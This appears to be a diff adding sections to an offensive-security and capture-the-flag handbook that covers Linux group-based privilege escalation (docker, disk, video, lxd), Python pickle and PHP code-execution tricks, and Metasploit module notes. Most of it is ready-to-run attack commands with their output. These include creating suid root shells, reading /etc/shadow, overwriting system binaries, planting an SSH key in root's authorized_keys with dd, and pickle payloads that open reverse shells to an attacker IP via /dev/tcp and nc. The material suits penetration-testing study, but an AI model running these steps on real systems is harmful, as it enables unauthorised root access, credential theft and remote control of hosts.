+* Copy binaries from the container into the host and give them suid permissions:
+
+ ::
+
+  docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh'
+
+  ./sh
+  whoami
+  # root
+
+ If the sh is not working, create a suid.c, compile it, suid it and run.
+
+* Mount system directories into docker and ask docker to read (and write) restricted files that should be out of your user’s clearance:
+
+ ::
+
+
+  docker run -v /etc:/stuff -t my-docker-image /bin/sh -c 'cat shadow'
+  # root:!:16364:0:99999:7:::
+  # daemon:*:16176:0:99999:7:::
+  # bin:*:16176:0:99999:7:::
+  # ...
+
+* Bind the host’s / and overwrite system commands with rogue programs:
+
+ ::
+
+  docker run -v /:/stuff -t my-docker-image /bin/sh -c 'cp /stuff/rogue-program /stuff/bin/cat'
+
+* Privileged copy of bash for later access?
+
+ ::
+
+  docker run -v /:/stuff -t my-docker-image /bin/sh -c 'cp /stuff/bin/bash /stuff/bin/root-shell-ftw && chmod a+s /stuff/bin/root-shell-ftw'
+  root-shell-ftw  -p
+  root-shell-ftw-4.3#
+
+Video
+-----
+
+If the user is a part of the video group, he possibly might have access to the frame buffer (/dev/fb0) (which provides an abstraction for the video hardware), video capture devices, 2D/3D hardware acceleration. More details can be found at `Linux Framebuffer <https://en.wikipedia.org/wiki/Linux_framebuffer>`_ and `Kernel Framebuffer <https://www.kernel.org/doc/Documentation/fb/framebuffer.txt>`_
+
+If, we have access to the framebuffer device /dev/fb0. We can use a tool like `fb2png <https://github.com/AndrewFromMelbourne/fb2png>`_ to convert it to a png picture or we can cat it and get a file:
+
+::
+
+ cat /dev/fb0 > screenshot.raw
+
+ ls -l screenshot.raw 
+ -rw-rw-r-- 1 user user 4163040 May 18 03:52 screenshot.raw
+
+To find the screen resolution, we can read virtual size
+
+::
+
+ cat /sys/class/graphics/fb0/virtual_size
+ 1176,885
+
+We can then open the screenshot as a raw file (Select File Type: Raw Image Data) in Gimp, enter the width and height as well of the color arrangement, RGB, RGBA etc.
+
+Disk
+----
+
+Debian's wiki says about the "disk" group: Raw access to disks. Mostly equivalent to root access. The group disk can be very dangerous, since hard drives in /dev/sd* and /dev/hd* can be read and written bypassing any file system and any partition, allowing a normal user to disclose, alter and destroy both the partitions and the data of such drives without root privileges. Users should never belong to this group.
+
+We can use debugfs command to read everything and dd command to write anywhere.
+
+Read /root/.ssh/authorized_keys using debugfs:
+
+::
+
+ user@hostname:/tmp$ debugfs -w /dev/sda1 -R "cat /root/.ssh/authorized_keys"
+ debugfs 1.42.13 (17-May-2015)
+ ssh-rsa AAAAB3NzaC1yc2EAAAADAQA
+
+Let's find the block where the "/root/.ssh/authorized_keys" file resides:
+
+::
+
+ user@hostname:/tmp$ debugfs /dev/sda1 -R "blocks /root/.ssh/authorized_keys"
+ debugfs 1.42.13 (17-May-2015)
+ 1608806
+
+Let's use dd to write our own public key inside /root/.ssh/authorized_keys. This command will write over (i.e. it will replace) the old data:
+
+::
+
+ user@hostname:/tmp$ dd if=/tmp/id_rsa.pub of=/dev/sda1 seek=1608806 bs=4096 count=1
+ 0+1 records in
+ 0+1 records out
+ 394 bytes copied, 0.00239741 s, 164 kB/s
+
+It's important to sync afterwards:
+
+::
+
+ user@hostname:/tmp$ sync
+
+Read again to check if the file was overwritten
+
+::
+
+ user@hostname:/tmp$ debugfs -w /dev/sda1 -R "cat /root/.ssh/authorized_keys"
+ debugfs 1.42.13 (17-May-2015)
+ ssh-rsa AAAAB3NzaC1yc2EAAAADAQA
+
+More usage details about can be found at `debugfs Command Examples <https://www.cs.montana.edu/courses/309/topics/4-disks/debugfs_example.html>`_
+
+Set file system 
+^^^^^^^^^^^^^^^
+::
+
+ > debugfs /dev/hda6
+ debugfs 1.19, 13-Jul-2000 for EXT2 FS 0.5b, 95/08/09
+
+List files
+^^^^^^^^^^
+
+::
+
+ debugfs:  ls
+ 2790777 (12) .   32641 (12) ..   2790778 (12) dir1   2790781 (16) file1
+ 2790782 (4044) file2
+
+List the files with a long listing
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Format is:
+
+* Field 1:  Inode number.
+* Field 2:  First one or two digits is the type of node:
+ * 2 = Character device
+ * 4 = Directory
+ * 6 = Block device
+ * 10 = Regular file
+ * 12 = Symbolic link
+ * The Last four digits are the Linux permissions
+* Field 3: Owner uid
+* Field 4: Group gid
+* Field 5: Size in bytes.
+* Field 6: Date
+* Field 7: Time of last creation.
+* Field 8: Filename.
+
+::
+
+ debugfs:  ls -l
+ 2790777  40700   2605   2601    4096  5-Nov-2001 15:30 .
+  32641   40755   2605   2601    4096  5-Nov-2001 14:25 ..
+ 2790778  40700   2605   2601    4096  5-Nov-2001 12:43 dir1
+ 2790781 100600   2605   2601      14  5-Nov-2001 15:29 file1
+ 2790782 100600   2605   2601      14  5-Nov-2001 15:30 file2
+
+Dump the contents of file1
+^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+::
+
+ debugfs: cat file1
+ This is file1
+
+Dump an inode to a file
+^^^^^^^^^^^^^^^^^^^^^^^
+
+Same as cat, but to a file and using inode number instead of the file name.
+
+::
+
+ debugfs: dump <2790782> file1-debugfs
+
+The above will copy the file to your file-system, useful when the flag is not in a text file and is in the jpg file or somethingelse.
+
+LXD
+---
+
+The below has been taken from `LXD-Escape <https://reboare.github.io/lxd/lxd-escape.html>`_
+
+LXD is Ubuntu’s container manager utilising linux containers. It could be considered to act in the same sphere as docker. The lxd group should be considered harmful in the same way the docker group is. Under no circumstances should a user in a local container be given access to the lxd group.
+
+Exploiting
+^^^^^^^^^^
+
+::
+
+ ubuntu@ubuntu:~$ lxc init ubuntu:16.04 test -c security.privileged=true 
+ Creating test 
+
+ ubuntu@ubuntu:~$ lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
+ Device whatever added to test 
+
+ ubuntu@ubuntu:~$ lxc start test 
+ ubuntu@ubuntu:~$ lxc exec test bash
+
+Here we have created an lxc container, assigned it security privileges and mounted the full disk under /mnt/root
+
+::
+
+ ubuntu@ubuntu:~$ lxc exec test bash 
+ root@test:~# cd /mnt/root 
+ root@test:/mnt/root# ls 
+ bin   cdrom  etc   initrd.img  lib64       media  opt   root  sbin  srv  tmp  var 
+ boot  dev    home  lib         lost+found  mnt    proc  run   snap  sys  usr  vmlinuz 
+
+ root@test:/mnt/root# cd root 
+ root@test:/mnt/root/root# ls 
+ root@test:/mnt/root/root# touch ICanDoWhatever 
+ root@test:/mnt/root/root# exit 
+ exit 
+
+At this point, we can write a ssh public key to the root/.ssh folder and use that to access the machine.
+
+.. _A5-Coding-Languages-Tricks:
+
+A5: Coding Languages Tricks
+===========================
+
+Python 
+------
+
+Pickle
+^^^^^^
+
+If a website is using pickle to serialize and de-serialize the requests and probably using a unsafe way like 
+
+::
+
+  cPickle.loads(data)
+
+The pickle website say *Warning: The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.*
+
+we may use
+
+::
+
+  class Shell_code(object):
+  def __reduce__(self):
+          return (os.system,('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',))
+     or   return (os.system,('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.XX 4444 >/tmp/f',))
+  shell = cPickle.dumps(Shell_code())
+
+if we print shell variable above, it would look something like below if python version 2 is used
+
+::
+
+ cposix
+ system
+ p1
+ (S'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.XX 4444 >/tmp/f'
+ p2
+ tp3
+ Rp4
+ .
+
+and in python version 3
+
+::
+
+ b'\x80\x03cposix\nsystem\nq\x00XT\x00\x00\x00/rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|/bin/nc 10.10.14.26 4444 >/tmp/fq\x01\x85q\x02Rq\x03.'
+
+Pickle is imported in python 3 as
+
+::
+ 
+ import _pickle as cPickle
+
+and in python 2
+
+::
+
+ import cPickle
+
+
+Now, we can test locally that our code for shell is working by unpickling by
+
+::
+
+ #data.txt containing our Pickled data
+ import cPickle
+ path = "/tmp/data.txt"
+ data = open(path, "rb").read()
+ item = cPickle.loads(data)
+
+Refer `Understanding Python pickling and how to use it securely <https://www.synopsys.com/blogs/software-security/python-pickling/>`_ , `Sour Pickles <http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf>`_ and `Exploiting misuse of Python's "pickle" <https://blog.nelhage.com/2011/03/exploiting-pickle/>`_
+
+.. Tip :: It might be good idea to use requests (in case of Website) or socket (in case of listener) to send the payload.
+
+PHP
+---
+
+Preg_Replace
+^^^^^^^^^^^^
+
+PHP's preg_replace() function which can lead to RCE. It's deprecated in later revisions (PHP >= 5.5.0). If you think there's a pattern which is replaced in a text, refer `The unexpected dangers of preg_replace() <https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace>`_ and `Exploiting PHP PCRE Functions <http://www.madirish.net/402>`_ Under most circumstances the PCRE engine is completely safe. It does, however, provide the /e modifier which allows evaluation of PHP code in the preg_replace function. This can be extremely dangerous if used carelessly.
+
+Complex Curly Syntax
+^^^^^^^^^^^^^^^^^^^^
+
+PHP has `Complex (curly) syntax <http://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex>`_ The Complex Syntax to allow evaluation of our own code in double quotes. 
+  
+Example
+  
+:: 
+  
+  $use_me = "ls -lah"
+  {${system($use_me)}}
+
+This works because the outside curly brackets say give the contents of a variable/method/has to start with $, which is why we need the inner ${} to act as a variable. {${system($use_me)}} means, give the contents of ${system($use_me)} which in turn means use the contents of a variable named by the output of system($use_me).
+
+Xdebug
+^^^^^^
+
+If you find uncommon headers such as xdebug in the response, it might be possible to get a reverse shell. Xdebug is a php extension that allows to debug php pages, remotely by using DGBp protocol. Code execution is possible via injections that exist in eval or property_set xdebug commands. Refer `xpwn - exploiting xdebug enabled servers <https://redshark1802.com/blog/2015/11/13/xpwn-exploiting-xdebug-enabled-servers/>`_  and `xdebug-shell <https://github.com/gteissier/xdebug-shell>`_ 
+
+Type Juggling/ Magic Bytes
+^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+Type juggling in PHP is caused by an issue of loose operations versus strict operations. Strict comparisons will compare both the data values and the types associated to them. A loose comparison will use context to understand what type the data is. According to PHP documentation for comparison operations at `Language Operators Comparison <http://php.net/manual/en/language.operators.comparison.php>`_
+
+*If you compare a number with a string or the comparison involves numerical strings, then each string is converted to a number and the comparison performed numerically. These rules also apply to the switch statement. The type conversion does not take place when the comparison is === or !== as this involves comparing the type as well as the value.*
+
+So, if == or != is used to do the comparison or the password checks and if md5(of a string/number) results in a hash starting with 0e, there might be a possibility of bug.
+
+Refer `Magic Hashes <https://www.whitehatsec.com/blog/magic-hashes/>`_, `PHP Weak Typing Woes; With Some Pontification about Code and Pen Testing <https://pen-testing.sans.org/blog/2014/12/18/php-weak-typing-woes-with-some-pontification-about-code-and-pen-testing#>`_ and `Writing Exploits For Exotic Bug Classes: 
+PHP Type Juggling <http://turbochaos.blogspot.com/2013/08/exploiting-exotic-bugs-php-type-juggling.html>`_ 
+
+LUA
+---
+
+In Lua, when a developer uses unvalidated user data to run operating system commands via the os.execute() or io.popen() Lua functions, there can be command injection. A good paper to read is `Lua Web Application Security Vulnerabilities <http://seclists.org/fulldisclosure/2014/May/128>`_
+
+A6: Metasploit Module Writing?
+==============================
+
+.. Note :: This section is still under progress.
+
+* Creating a new module? create it in your home directory 
+
+  ::
+
+   mkdir -p $HOME/.msf4/modules/exploits
+
+ If you are using auxiliary or post modules, or are writing payloads you'll want to mkdir those as well.
+
+* Made some changes and want metasploit to pick up those changes? use
+
+  ::
+
+   msf > reload_all
+
+* Refer `Loading External Modules <https://github.com/rapid7/metasploit-framework/wiki/Loading-External-Modules>`_ for the above two points.
+
+* Want to edit a module or see the source code of it ? use edit in msfconsole (after selecting the module i.e use module_name)
+* Want to write some variable value (like the payload/ mof file) to a file? use
+
+ ::
+
+  File.Write('/path/to/file', 'Some glorious content')
+
+* Refer `Documentation for rapid7/metasploit-framework <https://www.rubydoc.info/github/rapid7/metasploit-framework/>`_
+* Refer `How to use WbemExec for a write privilege attack on Windows <https://github.com/rapid7/metasploit-framework/wiki/How-to-use-WbemExec-for-a-write-privilege-attack-on-Windows>`_ and `How to get started with writing an exploit <https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-an-exploit>`_
